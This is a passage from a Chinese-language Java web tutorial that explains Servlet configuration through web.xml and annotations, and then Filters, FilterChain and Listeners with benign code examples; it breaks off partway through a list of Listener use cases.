<h4 id="web-xml-示例："><a href="#web-xml-示例：" class="headerlink" title="web.xml 示例："></a><code>web.xml</code> 示例：</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;4.0&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 1. 声明一个名为 &quot;loginServlet&quot; 的 Servlet --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>loginServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.example.web.LoginServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">&lt;!-- 配置启动时加载，数字越小优先级越高 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 2. 将 URL &quot;/login&quot; 映射到 &quot;loginServlet&quot; --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>loginServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/login<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>当用户访问 <code>http://.../应用名/login</code> 时，Tomcat 就会调用 <code>com.example.web.LoginServlet</code> 的 <code>service</code> 方法。</p>
<p><strong>优点：</strong></p>
<ul>
<li><strong>集中管理：</strong> 所有配置集中在一个文件中，方便查看整个应用的路由结构。</li>
<li><strong>修改方便：</strong> 可以在不重新编译 Java 代码的情况下修改 URL 映射。</li>
</ul>
<p><strong>缺点：</strong></p>
<ul>
<li><strong>繁琐：</strong> 在大型项目中，<code>web.xml</code> 文件会变得异常庞大和复杂，难以维护。</li>
<li><strong>分散：</strong> 配置信息与代码本身分离，降低了代码的内聚性。</li>
</ul>
<hr>
<h3 id="3-2-现代方式：注解-Servlet-3-0"><a href="#3-2-现代方式：注解-Servlet-3-0" class="headerlink" title="3.2 现代方式：注解 (Servlet 3.0+)"></a>3.2 现代方式：注解 (Servlet 3.0+)</h3><p>从 <strong>Servlet 3.0 规范</strong>开始，引入了注解 (Annotation) 的方式来配置 Servlet，大大简化了开发过程。<strong>这是目前主流的配置方式</strong>。</p>
<ol>
<li><strong><code>@WebServlet</code> 注解</strong><ul>
<li><strong>作用：</strong> 直接在 Servlet 的 Java 类上使用此注解，即可完成声明和映射，<strong>完全替代</strong>了 <code>web.xml</code> 中的 <code>&lt;servlet&gt;</code> 和 <code>&lt;servlet-mapping&gt;</code>。</li>
<li><strong>常用属性：</strong><ul>
<li><code>value</code> 或 <code>urlPatterns</code>: 指定一个或多个 URL 模式。这是最常用的属性。<ul>
<li>例如：<code>@WebServlet(&quot;/login&quot;)</code></li>
<li>例如：<code>@WebServlet(urlPatterns = {&quot;/user/login&quot;, &quot;/user/auth&quot;})</code></li>
</ul>
</li>
<li><code>name</code>: (可选) 相当于 <code>&lt;servlet-name&gt;</code>。如果不指定，容器会默认使用类的全名。</li>
<li><code>loadOnStartup</code>: (可选) 相当于 <code>&lt;load-on-startup&gt;</code>，用于设置加载时机。</li>
<li><code>initParams</code>: (可选) 相当于 <code>&lt;init-param&gt;</code>，用于配置初始化参数，需要与 <code>@WebInitParam</code> 注解配合使用。</li>
</ul>
</li>
</ul>
</li>
<li><strong><code>@WebInitParam</code> 注解</strong><ul>
<li><strong>作用：</strong> 用于在 <code>@WebServlet</code> 的 <code>initParams</code> 属性中定义初始化参数。</li>
<li><strong>属性：</strong> <code>name</code> 和 <code>value</code>。</li>
</ul>
</li>
</ol>
<h4 id="注解示例："><a href="#注解示例：" class="headerlink" title="注解示例："></a>注解示例：</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用 @WebServlet 注解完成所有配置</span></span><br><span class="line"><span class="meta">@WebServlet(</span></span><br><span class="line"><span class="meta">    name = &quot;loginServlet&quot;,</span></span><br><span class="line"><span class="meta">    urlPatterns = &#123;&quot;/login&quot;, &quot;/signin&quot;&#125;, // 映射了两个 URL</span></span><br><span class="line"><span class="meta">    loadOnStartup = 1,</span></span><br><span class="line"><span class="meta">    initParams = &#123;</span></span><br><span class="line"><span class="meta">        @WebInitParam(name = &quot;loginPage&quot;, value = &quot;/login.jsp&quot;),</span></span><br><span class="line"><span class="meta">        @WebInitParam(name = &quot;errorPage&quot;, value = &quot;/error.jsp&quot;)</span></span><br><span class="line"><span class="meta">    &#125;</span></span><br><span class="line"><span class="meta">)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LoginServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        <span class="comment">// 读取初始化参数</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">loginPage</span> <span class="operator">=</span> <span class="built_in">this</span>.getInitParameter(<span class="string">&quot;loginPage&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Login Page from init param: &quot;</span> + loginPage);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;This is the Login Servlet configured by Annotation.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这段代码的效果与上面的 <code>web.xml</code> 示例完全相同，但配置与代码紧密结合，更加清晰直观。</p>
<p><strong>优点：</strong></p>
<ul>
<li><strong>简洁方便：</strong> 代码量大大减少，无需繁琐的 XML 配置。</li>
<li><strong>内聚性高：</strong> 配置信息和它所配置的类放在一起，提高了代码的可读性和可维护性。</li>
<li><strong>IDE 支持良好：</strong> 现代 IDE 对注解有很好的支持，可以方便地进行导航和重构。</li>
</ul>
<hr>
<h1 id="五、过滤器-Filter-与监听器-Listener"><a href="#五、过滤器-Filter-与监听器-Listener" class="headerlink" title="五、过滤器 (Filter) 与监听器 (Listener)"></a>五、过滤器 (Filter) 与监听器 (Listener)</h1><h2 id="1-Filter-过滤器"><a href="#1-Filter-过滤器" class="headerlink" title="1. Filter (过滤器)"></a>1. Filter (过滤器)</h2><h3 id="1-1-定义-3"><a href="#1-1-定义-3" class="headerlink" title="1.1 定义"></a>1.1 定义</h3><p><strong>Filter (过滤器)</strong> 是一个实现了 <code>javax.servlet.Filter</code> 接口的 Java 对象，它位于客户端请求和目标资源（如 Servlet、JSP 或静态文件）之间，用于<strong>拦截和处理请求与响应</strong>。</p>
<p><strong>核心作用：</strong></p>
<ul>
<li><strong>预处理请求：</strong> 在请求到达 Servlet 之前，可以检查、修改请求头和请求数据。</li>
<li><strong>后处理响应：</strong> 在响应发送给客户端之前，可以修改响应头和响应内容。</li>
<li><strong>拦截请求：</strong> 可以决定是否将请求继续传递给目标资源，或者直接中断请求流程（例如，用户未登录时跳转到登录页面）。</li>
</ul>
<p>Filter 是一种典型的<strong>责任链模式 (Chain of Responsibility Pattern)</strong> 的应用，它提供了一种对 Web 资源进行“横切”关注（如日志、安全、编码）的强大机制，而无需修改 Servlet 本身的代码，实现了<strong>低耦合</strong>。</p>
<hr>
<h3 id="1-2-Filter-生命周期"><a href="#1-2-Filter-生命周期" class="headerlink" title="1.2 Filter 生命周期"></a>1.2 Filter 生命周期</h3><p>Filter 的生命周期由 Servlet 容器管理，与 Servlet 非常相似，也包含三个核心方法：</p>
<ol>
<li><strong><code>void init(FilterConfig filterConfig)</code>: 初始化</strong><ul>
<li><strong>调用时机：</strong> Web 应用启动时，容器会创建 Filter 实例，并<strong>立即调用</strong> <code>init()</code> 方法。</li>
<li><strong>调用次数：</strong> 在 Filter 的整个生命周期中<strong>只调用一次</strong>。</li>
<li><strong>作用：</strong> 用于执行一次性的初始化任务，例如加载配置文件、创建数据库连接等。<code>FilterConfig</code> 对象可以用来获取初始化参数和 <code>ServletContext</code> 对象。</li>
</ul>
</li>
<li><strong><code>void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)</code>: 执行过滤</strong><ul>
<li><strong>调用时机：</strong> <strong>每一次</strong>匹配该 Filter 的 URL 模式的请求到达时，容器都会调用此方法。</li>
<li><strong>调用次数：</strong> <strong>多次</strong>。这是 Filter 的核心工作方法。</li>
<li><strong>作用：</strong> 实现具体的过滤逻辑。<ul>
<li><strong><code>chain.doFilter(request, response)</code></strong> 是这个方法中最关键的一行代码。</li>
<li><strong>放行操作：</strong> 调用 <code>chain.doFilter()</code> 会将请求传递给过滤器链中的下一个 Filter，或者如果已经是最后一个 Filter，则传递给目标资源（Servlet）。</li>
<li><strong>代码位置决定处理时机：</strong><ul>
<li>在 <code>chain.doFilter()</code> <strong>之前</strong>写的代码，是对<strong>请求 (Request)</strong> 的预处理。</li>
<li>在 <code>chain.doFilter()</code> <strong>之后</strong>写的代码，是对<strong>响应 (Response)</strong> 的后处理。</li>
</ul>
</li>
<li><strong>拦截操作：</strong> 如果在方法中<strong>不调用</strong> <code>chain.doFilter()</code>，则请求将被拦截，不会继续向下传递。</li>
</ul>
</li>
</ul>
</li>
<li><strong><code>void destroy()</code>: 销毁</strong><ul>
<li><strong>调用时机：</strong> Web 应用被卸载或服务器关闭时，容器会调用 <code>destroy()</code> 方法。</li>
<li><strong>调用次数：</strong> <strong>只调用一次</strong>。</li>
<li><strong>作用：</strong> 用于释放 <code>init()</code> 方法中创建的资源，例如关闭数据库连接、文件流等。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="1-3-FilterChain-过滤器链"><a href="#1-3-FilterChain-过滤器链" class="headerlink" title="1.3 FilterChain (过滤器链)"></a>1.3 <code>FilterChain</code> (过滤器链)</h3><p>当一个请求的 URL 同时匹配多个 Filter 的映射规则时，Servlet 容器会将这些 Filter 按照它们在 <code>web.xml</code> 中配置的顺序（或者注解的特定顺序，但 XML 提供了更明确的控制）组织成一个<strong>过滤器链 (<code>FilterChain</code>)</strong>。</p>
<pre><code class="highlight mermaid">sequenceDiagram
    actor Client
    participant Filter1
    participant Filter2
    participant Servlet

    rect rgb(235, 245, 255)
        note over Client, Servlet: 请求阶段 (Request Flow)
        Client-&gt;&gt;+Filter1: 1. 发起 HTTP Request
        note right of Filter1: 2. 执行 chain.doFilter() 之前的代码
        Filter1-&gt;&gt;+Filter2: 3. 调用 chain.doFilter()
        note right of Filter2: 4. 执行 chain.doFilter() 之前的代码
        Filter2-&gt;&gt;+Servlet: 5. 调用 chain.doFilter()
        note right of Servlet: 6. Servlet.service() 处理请求
    end

    rect rgb(255, 245, 235)
        note over Client, Servlet: 响应阶段 (Response Flow)
        Servlet--&gt;&gt;-Filter2: 7. 生成 HTTP Response 并返回
        note left of Filter2: 8. 执行 chain.doFilter() 之后的代码
        Filter2--&gt;&gt;-Filter1: (继续返回)
        note left of Filter1: 8. 执行 chain.doFilter() 之后的代码
        Filter1--&gt;&gt;-Client: 9. 最终响应返回给客户端
    end</code></pre>

<p><strong>工作流程:</strong></p>
<ol>
<li>请求首先到达链中的第一个 Filter (<code>Filter1</code>)。</li>
<li><code>Filter1</code> 执行其 <code>doFilter()</code> 方法中 <code>chain.doFilter()</code> 之前的代码。</li>
<li><code>Filter1</code> 调用 <code>chain.doFilter()</code>，控制权转移给链中的第二个 Filter (<code>Filter2</code>)。</li>
<li><code>Filter2</code> 执行其 <code>doFilter()</code> 方法…以此类推，直到最后一个 Filter。</li>
<li>最后一个 Filter 调用 <code>chain.doFilter()</code>，请求最终到达目标 Servlet。</li>
<li>Servlet 处理请求，生成响应。</li>
<li>响应沿着<strong>相反的路径</strong>返回，依次经过链中的每个 Filter。</li>
<li>每个 Filter 执行其 <code>doFilter()</code> 方法中 <code>chain.doFilter()</code> <strong>之后</strong>的代码，可以对响应进行处理。</li>
<li>最终，响应从第一个 Filter 发送回客户端。</li>
</ol>
<hr>
<h3 id="1-4-配置"><a href="#1-4-配置" class="headerlink" title="1.4 配置"></a>1.4 配置</h3><p>与 Servlet 类似，Filter 也有两种配置方式：</p>
<ol>
<li><p><strong>传统方式 (<code>web.xml</code>)</strong></p>
<ul>
<li><strong><code>&lt;filter&gt;</code> 标签：</strong> 声明一个 Filter。<ul>
<li><code>&lt;filter-name&gt;</code>: Filter 的逻辑名称。</li>
<li><code>&lt;filter-class&gt;</code>: Filter 的完整类名。</li>
</ul>
</li>
<li><strong><code>&lt;filter-mapping&gt;</code> 标签：</strong> 映射 Filter。<ul>
<li><code>&lt;filter-name&gt;</code>: 与 <code>&lt;filter&gt;</code> 中的名称对应。</li>
<li><code>&lt;url-pattern&gt;</code>: 指定要过滤的 URL 模式（如 <code>/*</code>, <code>/admin/*</code>, <code>*.do</code>）。</li>
<li><code>&lt;dispatcher&gt;</code>: (可选) 指定 Filter 拦截的请求类型，可以是 <code>REQUEST</code> (默认), <code>FORWARD</code>, <code>INCLUDE</code>, <code>ERROR</code>。</li>
</ul>
</li>
</ul>
<p><strong><code>web.xml</code> 示例:</strong></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>encodingFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>com.example.filter.CharacterEncodingFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>encodingFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span> <span class="comment">&lt;!-- 拦截所有请求 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>现代方式 (注解 <code>@WebFilter</code>)</strong></p>
<ul>
<li>在 Filter 实现类上使用 <code>@WebFilter</code> 注解即可完成配置。</li>
<li><strong>常用属性:</strong> <code>urlPatterns</code> (或 <code>value</code>), <code>filterName</code>, <code>initParams</code>, <code>dispatcherTypes</code>。</li>
</ul>
<p><strong>注解示例:</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@WebFilter(&quot;/*&quot;)</span> <span class="comment">// 拦截所有请求</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CharacterEncodingFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span></span><br><span class="line">            <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 预处理：设置请求编码</span></span><br><span class="line">        request.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 将请求传递下去</span></span><br><span class="line">        chain.doFilter(request, response);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 后处理：可以设置响应编码，但通常在 Servlet 中设置更灵活</span></span><br><span class="line">        <span class="comment">// response.setContentType(&quot;text/html;charset=UTF-8&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// init 和 destroy 方法可以留空</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<hr>
<h3 id="1-5-典型应用场景"><a href="#1-5-典型应用场景" class="headerlink" title="1.5 典型应用场景"></a>1.5 典型应用场景</h3><p>Filter 的应用非常广泛，是许多 Web 框架实现核心功能的基础。</p>
<ul>
<li><strong>统一字符编码 (Character Encoding Filter):</strong><ul>
<li>这是最经典的应用。创建一个 Filter 拦截所有请求，在 <code>doFilter</code> 方法中统一设置 <code>request.setCharacterEncoding(&quot;UTF-8&quot;)</code>，一劳永逸地解决全站的 POST 请求中文乱码问题。</li>
</ul>
</li>
<li><strong>用户登录验证 (Authentication Filter):</strong><ul>
<li>拦截需要登录才能访问的资源（如 <code>/admin/*</code>）。</li>
<li>检查 <code>HttpSession</code> 中是否存在用户登录信息。</li>
<li>如果存在，则调用 <code>chain.doFilter()</code> 放行。</li>
<li>如果不存在，则重定向到登录页面，并且<strong>不调用</strong> <code>chain.doFilter()</code> 来中断请求。</li>
</ul>
</li>
<li><strong>权限控制 (Authorization Filter):</strong><ul>
<li>在用户已登录的基础上，检查用户是否拥有访问特定资源的权限（如角色是管理员还是普通用户）。</li>
<li>如果没有权限，则跳转到“无权限”提示页面。</li>
</ul>
</li>
<li><strong>请求日志记录 (Logging Filter):</strong><ul>
<li>记录每个请求的详细信息，如来源 IP、请求 URL、请求参数、处理时长等，用于系统监控和问题排查。</li>
</ul>
</li>
<li><strong>数据压缩 (GZIP Compression Filter):</strong><ul>
<li>拦截响应，将响应体（如 HTML, CSS, JS）进行 GZIP 压缩，并在响应头中设置 <code>Content-Encoding: gzip</code>，可以显著减少传输大小，加快页面加载速度。</li>
</ul>
</li>
<li><strong>XSS&#x2F;CSRF 安全防护:</strong><ul>
<li>创建 Filter 来包装 <code>HttpServletRequest</code> 对象，重写 <code>getParameter()</code> 等方法，对传入的参数进行过滤和转义，防止跨站脚本攻击 (XSS)。</li>
</ul>
</li>
</ul>
<hr>
<h2 id="2-Listener-监听器"><a href="#2-Listener-监听器" class="headerlink" title="2. Listener (监听器)"></a>2. Listener (监听器)</h2><h3 id="2-1-定义-1"><a href="#2-1-定义-1" class="headerlink" title="2.1 定义"></a>2.1 定义</h3><p><strong>Listener (监听器)</strong> 是一种特殊的 Java 类，它实现了 Servlet API 中特定的监听器接口。它的作用是<strong>被动地监听</strong> Web 应用中特定<strong>事件</strong>的发生，并在事件发生时执行预定义的代码。</p>
<p>你可以把它想象成一个**“事件报警器”<strong>或</strong>“订阅者”**。它在 Web 应用的生命周期中静静地等待，当它所“订阅”的事件（例如：应用启动、Session 创建、请求到达）发生时，Servlet 容器会自动通知它，并调用其相应的方法。</p>
<p><strong>核心特点：</strong></p>
<ul>
<li><strong>事件驱动 (Event-Driven):</strong> 监听器的工作模式是基于事件的，而不是像 Servlet 或 Filter 那样直接处理请求。</li>
<li><strong>被动触发:</strong> 我们不直接调用监听器的方法，而是由 Servlet 容器在特定事件发生时自动回调。</li>
<li><strong>全局监控:</strong> 监听器提供了一种从宏观层面监控和干预 Web 应用状态变化的方式。</li>
</ul>
<hr>
<h3 id="2-2-分类"><a href="#2-2-分类" class="headerlink" title="2.2 分类"></a>2.2 分类</h3><p>Servlet API 提供了多种监听器接口，根据它们监听的<strong>事件源</strong>和<strong>事件类型</strong>，主要可以分为三大类：</p>
<h4 id="2-2-1-监听作用域对象生命周期的-Listener"><a href="#2-2-1-监听作用域对象生命周期的-Listener" class="headerlink" title="2.2.1 监听作用域对象生命周期的 Listener"></a>2.2.1 监听作用域对象生命周期的 Listener</h4><p>这类监听器关注三大作用域对象（<code>ServletContext</code>, <code>HttpSession</code>, <code>ServletRequest</code>）的<strong>创建和销毁</strong>。</p>
<ul>
<li><strong><code>ServletContextListener</code> (最常用):</strong><ul>
<li><strong>监听对象:</strong> <code>ServletContext</code> (整个 Web 应用)</li>
<li><strong>事件:</strong> Web 应用的启动和关闭。</li>
<li><strong>方法:</strong><ul>
<li><code>contextInitialized(ServletContextEvent sce)</code>: 在 Web 应用<strong>被加载</strong>时调用。</li>
<li><code>contextDestroyed(ServletContextEvent sce)</code>: 在 Web 应用<strong>被卸载</strong>时调用。</li>
</ul>
</li>
</ul>
</li>
<li><strong><code>HttpSessionListener</code>:</strong><ul>
<li><strong>监听对象:</strong> <code>HttpSession</code> (用户会话)</li>
<li><strong>事件:</strong> 一个会话的创建和销毁。</li>
<li><strong>方法:</strong><ul>
<li><code>sessionCreated(HttpSessionEvent se)</code>: 在一个<strong>新会话被创建</strong>时调用。</li>
<li><code>sessionDestroyed(HttpSessionEvent se)</code>: 在一个<strong>会话失效或被销毁</strong>时调用。</li>
</ul>
</li>
</ul>
</li>
<li><strong><code>ServletRequestListener</code>:</strong><ul>
<li><strong>监听对象:</strong> <code>ServletRequest</code> (一次请求)</li>
<li><strong>事件:</strong> 一次 HTTP 请求的开始和结束。</li>
<li><strong>方法:</strong><ul>
<li><code>requestInitialized(ServletRequestEvent sre)</code>: 在一个<strong>请求到达</strong> Servlet 容器时调用。</li>
<li><code>requestDestroyed(ServletRequestEvent sre)</code>: 在一个<strong>请求处理完毕</strong>并即将离开容器时调用。</li>
</ul>
</li>
</ul>
</li>
</ul>
<hr>
<h4 id="2-2-2-监听作用域对象属性变化的-Listener"><a href="#2-2-2-监听作用域对象属性变化的-Listener" class="headerlink" title="2.2.2 监听作用域对象属性变化的 Listener"></a>2.2.2 监听作用域对象属性变化的 Listener</h4><p>这类监听器关注三大作用域对象中<strong>属性 (Attribute) 的添加、移除和替换</strong>。</p>
<ul>
<li><strong><code>ServletContextAttributeListener</code>:</strong> 监听 <code>ServletContext</code> 中属性的变化。</li>
<li><strong><code>HttpSessionAttributeListener</code>:</strong> 监听 <code>HttpSession</code> 中属性的变化。</li>
<li><strong><code>ServletRequestAttributeListener</code>:</strong> 监听 <code>ServletRequest</code> 中属性的变化。</li>
<li><strong>它们都包含三个方法:</strong><ul>
<li><code>attributeAdded(...)</code>: 当调用 <code>setAttribute</code> 添加一个新属性时触发。</li>
<li><code>attributeRemoved(...)</code>: 当调用 <code>removeAttribute</code> 时触发。</li>
<li><code>attributeReplaced(...)</code>: 当调用 <code>setAttribute</code> 替换一个同名旧属性时触发。</li>
</ul>
</li>
</ul>
<hr>
<h4 id="2-2-3-监听-Session-中对象状态的-Listener"><a href="#2-2-3-监听-Session-中对象状态的-Listener" class="headerlink" title="2.2.3 监听 Session 中对象状态的 Listener"></a>2.2.3 监听 Session 中对象状态的 Listener</h4><p>这类监听器由<strong>被存入 Session 的对象本身</strong>来实现，用于感知自己何时被绑定到 Session 或从 Session 解绑。</p>
<ul>
<li><strong><code>HttpSessionBindingListener</code>:</strong><ul>
<li>当一个<strong>实现了此接口的对象</strong>被 <code>session.setAttribute()</code> 存入 Session 或被 <code>session.removeAttribute()</code> 移除时，该对象自身的方法会被调用。</li>
<li><strong>方法:</strong> <code>valueBound(...)</code>, <code>valueUnbound(...)</code></li>
</ul>
</li>
</ul>
<hr>
<h3 id="2-3-配置"><a href="#2-3-配置" class="headerlink" title="2.3 配置"></a>2.3 配置</h3><p>与 Servlet 和 Filter 一样，监听器也支持 <code>web.xml</code> 和注解两种配置方式。</p>
<ol>
<li><p><strong>传统方式 (<code>web.xml</code>)</strong></p>
<ul>
<li>使用 <code>&lt;listener&gt;</code> 标签来声明一个监听器。</li>
<li>它只有一个子标签 <code>&lt;listener-class&gt;</code>，用于指定监听器的完整类名。</li>
</ul>
<p><strong><code>web.xml</code> 示例:</strong></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">...</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>com.example.listener.MyAppContextListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>现代方式 (注解 <code>@WebListener</code>)</strong></p>
<ul>
<li>在监听器实现类上添加 <code>@WebListener</code> 注解即可。</li>
<li>这是一个标记注解，没有任何属性。容器在启动时会自动扫描带有此注解的类并注册它们。</li>
</ul>
<p><strong>注解示例:</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@WebListener</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyAppContextListener</span> <span class="keyword">implements</span> <span class="title class_">ServletContextListener</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">contextInitialized</span><span class="params">(ServletContextEvent sce)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Web Application is starting up...&quot;</span>);</span><br><span class="line">        <span class="comment">// 在这里执行初始化任务</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">contextDestroyed</span><span class="params">(ServletContextEvent sce)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Web Application is shutting down...&quot;</span>);</span><br><span class="line">        <span class="comment">// 在这里执行清理任务</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<hr>
<h3 id="2-4-典型应用场景"><a href="#2-4-典型应用场景" class="headerlink" title="2.4 典型应用场景"></a>2.4 典型应用场景</h3><p>监听器在框架和大型应用中扮演着至关重要的“引导”和“监控”角色。</p>
<ul>
<li><strong>使用 <code>ServletContextListener</code>:</strong><ul>
<li><strong>初始化全局资源 (重量级应用):</strong><ul>
<li>创建和初始化<strong>数据库连接池</strong>（如 HikariCP, C3P0）。</li>
